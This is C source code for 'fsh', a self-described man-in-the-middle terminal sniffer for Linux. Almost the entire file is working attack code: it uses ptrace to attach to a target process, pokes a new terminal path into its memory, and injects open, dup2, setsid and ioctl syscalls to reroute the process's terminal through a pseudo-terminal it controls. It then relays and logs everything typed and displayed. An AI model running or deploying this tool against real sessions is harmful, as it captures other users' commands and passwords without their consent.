
/***********************************************************************
 *		
 *	What do you call a fish with no eyes?
 *		fsh 
 *		
 *	baigu's funky shell: a mitm terminal sniffer
 *	20120-12-24
 *		
 *	pseudorandom
 *	@	
 *	gmail
 *	.com
 *
 *	Bash example:
 *		(before)
 *		term(/dev/ptmx)	---0-->	bash(/dev/pts/x)
 *		term(/dev/ptmx)	<--1---	bash(/dev/pts/x)
 *		term(/dev/ptmx)	<--2---	bash(/dev/pts/x)
 *		term(/dev/ptmx)	<-255->	bash(/dev/pts/x)
 *
 *		(after)
 *		term(/dev/ptmx)	<--fd->	fsh(/dev/pts/x)
 *		fsh(/dev/ptmx)	---0-->	bash(/dev/pts/y)
 *		fsh(/dev/ptmx)	<--1---	bash(/dev/pts/y)
 *		fsh(/dev/ptmx)	<--2---	bash(/dev/pts/y)
 *		fsh(/dev/ptmx)	<-255->	bash(/dev/pts/y)
 *
 *	Developed with:
 *		gcc -std=gnu99 -Wall -Wextra -pedantic -o fsh fsh.c
 *		gcc --version: gcc (Debian 4.4.5-8) 4.4.5
 *		Linux 3.2.0-0.bpo.2-amd64 #1 SMP Mon May 28 15:35:15 UTC 2012 x86_64 GNU/Linux
 *
 **********************************************************************/

#define _XOPEN_SOURCE 600
#define _GNU_SOURCE

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <limits.h>
#include <regex.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <termios.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/ptrace.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>


// 256 is the readline buffer size in bash.
#define BUFFER_SIZE 256

/* declare our data structures */
union word{
	long long_word;
	char char_word[sizeof(long)];
};

struct chunk_o_mem {
	unsigned long address;
	int count;
	char contents[BUFFER_SIZE];
};

/* main functions */
int	open_tty(int target_pid, char *target_fd_list);
unsigned long ptrace_syscall(int target_pid, struct user_regs_struct *saved_regs, \
		unsigned long rax, unsigned long rdi, unsigned long rsi, unsigned long rdx);

/* helper functions */
long ptrace_do(enum __ptrace_request request, pid_t pid, void *addr, void *data);
void waitpid_do(pid_t pid);

/* debug functions */
#ifdef DEBUG
void print_urs(struct user_regs_struct *urs_in);
#endif

/***********************************************************************
 *	int main(int argc, char **argv)
 *		input: n/a
 *		output: n/a
 **********************************************************************/
int main(int argc, char **argv){

	char scratch[BUFFER_SIZE];
		
	// fd list by bitmap
	char target_fd_list[(UCHAR_MAX + 1) / CHAR_BIT];

	// 0 -> original tty, 1 -> master tty
	int fd[2];
	int slave_fd;

	int target_pid;
	int i, bytes_read, return_val, cleanup = 0;

	fd_set fd_select;

	union word ptrace_data;

	struct user_regs_struct saved_regs;
	struct chunk_o_mem saved_mem;

	struct termios termios_attrs;

	/* usage check. */
	if(argc != 2){
		fprintf(stderr, "usage: %s TARGET_PID\n", program_invocation_name);
		exit(-1);
	}

	/* grab target pid from argv. */
	target_pid = (pid_t) strtol(argv[1], NULL, 10);
	if(errno || !target_pid){
		error(-1, errno, "strtol(%s, NULL, 10)", argv[1]);
	}

	/* 2nd usage check, now that we know target value. */
	if(!target_pid){
		fprintf(stderr, "usage: %s TARGET_PID\n", program_invocation_name);
		exit(-1);
	}

	/* open the targets current tty read/write. */
	memset(target_fd_list, 0, sizeof(target_fd_list));
	fd[0] = open_tty(target_pid, target_fd_list);

	if(tcgetattr(fd[0], &termios_attrs)){
		error(-1, errno, "tcgetattr()");
	}

	cfmakeraw(&termios_attrs);

	if(tcsetattr(fd[0], TCSANOW, &termios_attrs)){
		error(-1, errno, "tcsetattr()");
	}


	/* setup ptmx / pts devices */	
	if((fd[1] = posix_openpt(O_RDWR)) == -1){
		error(-1, errno, "posix_openpt(%d)", O_RDWR);
	}

	if(grantpt(fd[1])){
		error(-1, errno, "grantpt(%d)", fd[1]);
	}

	if(unlockpt(fd[1])){
		error(-1, errno, "unlockpt(%d)", fd[1]);
	}

	memcpy(&scratch, ptsname(fd[1]), sizeof(scratch));

	/* ptrace the target to re-arrange its fd list and controlling terminal. */

	/* attach to the target process */
	ptrace_do(PTRACE_ATTACH, target_pid, NULL, NULL);
	waitpid_do(target_pid);

	/* grab target processes registers and memory for restoration later. */
	memset(&saved_regs, 0, sizeof(saved_regs));
	ptrace_do(PTRACE_GETREGS, target_pid, NULL, &saved_regs);

	/* save memory for later restoration */
	memset(&saved_mem, 0, sizeof(saved_mem));
	saved_mem.count = (strlen(scratch) + 1) / sizeof(long);
	if((strlen(scratch) + 1) % sizeof(long)) saved_mem.count++;

	saved_mem.address = (saved_regs.rsp & ~(sizeof(long) - 1)) + sizeof(long);

	for(i = 0; i < saved_mem.count; i++){
		ptrace_data.long_word = ptrace_do(PTRACE_PEEKTEXT, target_pid, (void *) (saved_mem.address + (i * sizeof(long))), NULL);
		memcpy(&(saved_mem.contents[i * sizeof(long)]), ptrace_data.char_word, sizeof(long));
	}

	/* setup attack memory */
	memset(&ptrace_data, 0, sizeof(ptrace_data));
	for(i = 0; i < saved_mem.count; i++){
		memcpy(ptrace_data.char_word, &(scratch[i * sizeof(long)]), sizeof(long));
		ptrace_do(PTRACE_POKETEXT, target_pid, (void *) (saved_mem.address + (i * sizeof(long))), (void *) ptrace_data.long_word);
	}

	//  e.g. exit();
	//	ptrace_syscall(target_pid, &saved_regs, __NR_exit, 42, 0, 0);

	for(i = 0; i <= UCHAR_MAX; i++){
		if((target_fd_list[i / CHAR_BIT] & (1 << (i % CHAR_BIT)))){

			if((return_val = (int) ptrace_syscall(target_pid, &saved_regs, __NR_fcntl, i, F_GETFL, 0)) == 1){
				fprintf(stderr, "remote fcntl() syscall failed. Attempting graceful exit.\n");
				cleanup = 1;
				goto cleanup;
			}
		
			if((slave_fd = ptrace_syscall(target_pid, &saved_regs, __NR_open, saved_mem.address, return_val, 0)) == -1){
				fprintf(stderr, "remote open() syscall failed. Attempting graceful exit.\n");
				cleanup = 1;
				goto cleanup;
			}

			if((return_val = (int) ptrace_syscall(target_pid, &saved_regs, __NR_dup2, slave_fd, i, 0)) == -1){
				fprintf(stderr, "remote dup2() syscall failed (%d). Attempting graceful exit.\n", return_val);
				cleanup = 1;
				goto cleanup;
			}

			ptrace_syscall(target_pid, &saved_regs, __NR_close, slave_fd, 0, 0);
		}
	}

	ptrace_syscall(target_pid, &saved_regs, __NR_setsid, 0, 0, 0);

	if((return_val = (int) ptrace_syscall(target_pid, &saved_regs, __NR_ioctl, 0, TIOCSCTTY, 1)) == -1){
		fprintf(stderr, "remote ioctl() syscall failed (%d). Non-fatal. Moving on.\n", return_val);
	}

cleanup: 
	for(i = 0; i < saved_mem.count; i++){
		memcpy(ptrace_data.char_word, &(saved_mem.contents[i * sizeof(long)]), sizeof(long));
		ptrace_do(PTRACE_POKETEXT, target_pid, (void *) (saved_mem.address + (i * sizeof(long))), (void *) ptrace_data.long_word);
	}

	ptrace_do(PTRACE_SETREGS, target_pid, NULL, &saved_regs);
	ptrace_do(PTRACE_DETACH, target_pid, NULL, NULL);

	/* now proceed to direct char device traffic as appropriate. */
	if(!cleanup){

		/* Dont need this, but it's interesting that the master side of the term will affect changes to the term. 
			 if(tcgetattr(fd[1], &termios_attrs)){
			 error(-1, errno, "tcgetattr()");
			 }

			 cfmakeraw(&termios_attrs);

			 if(tcsetattr(fd[1], TCSANOW, &termios_attrs)){
			 error(-1, errno, "tcsetattr()");
			 }
		 */

		while(1){
#ifdef DEBUG
			printf("DEBUG: ##########\n");
#endif
			FD_ZERO(&fd_select);
			FD_SET(fd[0], &fd_select);
			FD_SET(fd[1], &fd_select);

			if((return_val = select(fd[1] + 1, &fd_select, NULL, NULL, NULL)) == -1){
				error(-1, errno, "select()");
			}

			for(i = 0; i < 2; i++){
				if(FD_ISSET(fd[i], &fd_select)){
#ifdef DEBUG
					printf("DEBUG: %d: FD_ISSET(%d, %lx): %d\n", i, fd[i], (unsigned long) &fd_select, FD_ISSET(fd[i], &fd_select));
#endif

					memset(&scratch, 0, sizeof(scratch));
					if((return_val = read(fd[i], scratch, sizeof(scratch))) == -1){
						error(-1, errno, "read()");
					}
					bytes_read = return_val;

#ifdef DEBUG
					printf("DEBUG: read(%d, %lx, %d): %d\n", fd[i], (unsigned long) scratch, (int) sizeof(scratch), return_val);
					printf("DEBUG: scratch: |%s|\n", scratch);
#endif

					if((return_val = write(fd[i ^ 1], scratch, bytes_read)) == -1){
						error(-1, errno, "write()");
					}

					// XXX this if() is to deal w/duplicate output from echo. I still don't understand this.
					if(i){
						if((return_val = write(1, scratch, bytes_read)) == -1){
							error(-1, errno, "write()");
						}
					}

#ifdef DEBUG
					printf("DEBUG: write(%d, %lx, %d): %d\n", fd[i ^ 1], (unsigned long) scratch, bytes_read, return_val);
					printf("DEBUG: scratch: |%s|\n", scratch);
#endif
				}	
			}
		}
	}

	return(0);
}

/***********************************************************************
 *	int open_tty(int target, char *target_fd_list)
 *		input:
 *			Pid of the target process. 
 *			A pointer to a bit array that represents the targets open fd list.
 *		returns:
 *			An open fd for the target processes terminal.
 **********************************************************************/
int open_tty(int target_pid, char *target_fd_list){
	char path[BUFFER_SIZE], target_tty[BUFFER_SIZE], scratch[BUFFER_SIZE];

	DIR *target_proc_dir;
	struct dirent *dir_entry;

	int this_fd, this_tty, num_offset;
	char *tmp_ptr;


	// Examine the target's open fd list in /proc.
	memset(path, 0, sizeof(path));
	if(snprintf(path, sizeof(path), "/proc/%d/fd/", target_pid) < 0){
		error(-1, errno, "snprintf()");
	}	

	if(!(target_proc_dir = opendir(path))){
		error(-1, errno, "opendir(%s)", path);
	}

	// Step through every open fd and look at the link it points to.
	memset(target_tty, 0, sizeof(target_tty));
	while((dir_entry = readdir(target_proc_dir))){

		// Skip . and .. 
		if(!(strcmp(dir_entry->d_name, ".") && strcmp(dir_entry->d_name, ".."))){
			continue;
		}

		this_fd = strtol(dir_entry->d_name, NULL, 10);
		if(errno){
			error(-1, errno, "strtol(%s, NULL, 10)", dir_entry->d_name);
		}

		// Dereference the link.
		memset(scratch, 0, sizeof(scratch));
		if(snprintf(scratch, sizeof(scratch), "/proc/%d/fd/%s", target_pid, dir_entry->d_name) < 0){
			error(-1, errno, "snprintf()");
		}	

		memset(path, 0, sizeof(path));
		if(readlink(scratch, path, sizeof(path) - 1) == -1){
			error(-1, errno, "readlink()");
		}

		// Check if the link is of either form /dev/ttyx or /dev/pts/x for some int x.
		num_offset = 8;
		if((strncmp("/dev/tty", path, num_offset++) && strncmp("/dev/pts/", path, num_offset))){
			continue;
		}

		strtol(&(path[num_offset]), &tmp_ptr, 10);
		if(errno){
			fprintf(stderr, "%s is causing problems: %s. Skipping.\n", path, strerror(errno));
			continue;
		}else if(*tmp_ptr){
			fprintf(stderr, "%s is not a number. Skipping.\n", &(path[num_offset]));
			continue;
		}
		// This seems like an appropriate terminal.

		// Remember this terminal if we haven't seen one yet.	
		tmp_ptr = strchr(target_tty, '\0');
		if(tmp_ptr == target_tty){
			strncpy(target_tty, path, sizeof(target_tty));

			// Also make sure this target isn't connected to multiple terminals.
		}else if(strncmp(target_tty, path, sizeof(target_tty))){
			fprintf(stderr, "Target %d appears have multiple terminals. Quitting.\n", target_pid);
			exit(-1);			
		}

		// Save the fd number that points to this terminal in the bitmap list.
		target_fd_list[this_fd / CHAR_BIT] |= (1 << (this_fd % CHAR_BIT));
	}	
	if(errno){
		error(-1, errno, "readdir(%lx)", (unsigned long) target_proc_dir);
	}

	closedir(target_proc_dir);

	// If we didn't find any terminals for this target, go ahead and quit.
	tmp_ptr = strchr(target_tty, '\0');
	if(tmp_ptr == target_tty){
		fprintf(stderr, "Target %d does not appear to have any terminals. Quitting.\n", target_pid);
		exit(-1);
	}

	//	Now that we seem to have identified the targets terminal, lets open it up.
	if((this_tty = open(target_tty, O_RDWR)) == -1){
		error(-1, errno, "open(%s, %d)", target_tty, O_RDWR);
	}

	return(this_tty);	
}

/***********************************************************************
 * unsigned long ptrace_syscall(int target_pid, struct user_regs_struct *saved_regs, \
 *			unsigned long rax, unsigned long rdi, unsigned long rsi, unsigned long rdx)
 *	Input: 
 *		The pid of the target process.
 *		The user_regs_struct containing the state of the saved registers.
 *		The first three arguments for a syscall, in order: rax, rdi, rsi
 *	Output:
 *		Returns the values of rax as stored by the syscall.
 **********************************************************************/
unsigned long ptrace_syscall(int target_pid, struct user_regs_struct *saved_regs, \
		unsigned long rax, unsigned long rdi, unsigned long rsi, unsigned long rdx){

	struct user_regs_struct attack_regs;

	memcpy(&attack_regs, saved_regs, sizeof(attack_regs));
	attack_regs.rax = rax;
	attack_regs.rdi = rdi;
	attack_regs.rsi = rsi;
	attack_regs.rdx = rdx;
	attack_regs.rip = saved_regs->rip - 2;

#ifdef DEBUG
	//	print_urs(&attack_regs);
#endif

	ptrace_do(PTRACE_SETREGS, target_pid, NULL, &attack_regs);
	ptrace_do(PTRACE_SINGLESTEP, target_pid, NULL, NULL);
	waitpid_do(target_pid);
	ptrace_do(PTRACE_GETREGS, target_pid, NULL, &attack_regs);

	return(attack_regs.rax);	
}

/***********************************************************************
 * long ptrace_do(enum __ptrace_request request, pid_t pid, void *addr, void *data)
 *	Input: 
 *		A __ptrace_request enum representing the "Type of the REQUEST argument to `ptrace.'".
 *		The targets pid.
 *		A pointer to the ptrace addr argument.
 *		A pointer to the ptrace data argument.
 *	Output:
 *		The ptrace return code. (Varies by call type.)
 **********************************************************************/
long ptrace_do(enum __ptrace_request request, pid_t pid, void *addr, void *data){
	long return_val = 0;

#ifdef DEBUG
	printf("DEBUG: ptrace(%d, %d, %lx, %lx)\n", (int) request, (int) pid, (long unsigned int) addr, (long unsigned int) data);
#endif

	return_val = ptrace(request, pid, addr, data);
	if(errno){
		error(-1, errno, "ptrace(%d, %d, %lx, %lx)", (int) request, (int) pid, (long unsigned int) addr, (long unsigned int) data);
	}

	return(return_val);
}

/***********************************************************************
 * void waitpid_do(pid_t pid)
 * 	Input:
 *		The pid of the process to wait on.
 *	Output: 
 *		None.	
 **********************************************************************/
void waitpid_do(pid_t pid){
	int status;
	pid_t return_pid;

#ifdef DEBUG
	printf("DEBUG: waitpid(%d, %lx, 0)\n", (int) pid, (unsigned long) &status);
#endif

	if((return_pid = waitpid(pid, &status, 0)) < 1){
		error(-1, errno, "waitpid()");
	}

	if(!WIFSTOPPED(status)){
		fprintf(stderr, "%s: waitpid(): !WIFSTOPPED(status)\n", program_invocation_name);
		exit(-1);
	}
}

// debug routine
#ifdef DEBUG
void print_urs(struct user_regs_struct *urs_in){
	printf("&urs_in->%lx\n", (long int) &urs_in);
	printf("  r15->%lx\n", urs_in->r15);
	printf("  r14->%lx\n", urs_in->r14);
	printf("  r13->%lx\n", urs_in->r13);
	printf("  r112->%lx\n", urs_in->r12);
	printf("  rbp->%lx\n", urs_in->rbp);
	printf("  rbx->%lx\n", urs_in->rbx);
	printf("  r11->%lx\n", urs_in->r11);
	printf("  r10->%lx\n", urs_in->r10);
	printf("  r9->%lx\n", urs_in->r9);
	printf("  r8->%lx\n", urs_in->r8);
	printf("  rax->%lx\n", urs_in->rax);
	printf("  rcx->%lx\n", urs_in->rcx);
	printf("  rdx->%lx\n", urs_in->rdx);
	printf("  rsi->%lx\n", urs_in->rsi);
	printf("  rdi->%lx\n", urs_in->rdi);
	printf("  orig_rax->%lx\n", urs_in->orig_rax);
	printf("  rip->%lx\n", urs_in->rip);
	printf("  rcs->%lx\n", urs_in->cs);
	printf("  eflags->%lx\n", urs_in->eflags);
	printf("  rsp->%lx\n", urs_in->rsp);
	printf("  ss->%lx\n", urs_in->ss);
	printf("  fs_base->%lx\n", urs_in->fs_base);
	printf("  gs_base->%lx\n", urs_in->gs_base);
	printf("  ds->%lx\n", urs_in->ds);
	printf("  es->%lx\n", urs_in->es);
	printf("  fs->%lx\n", urs_in->fs);
	printf("  gs->%lx\n", urs_in->gs);
}
#endif
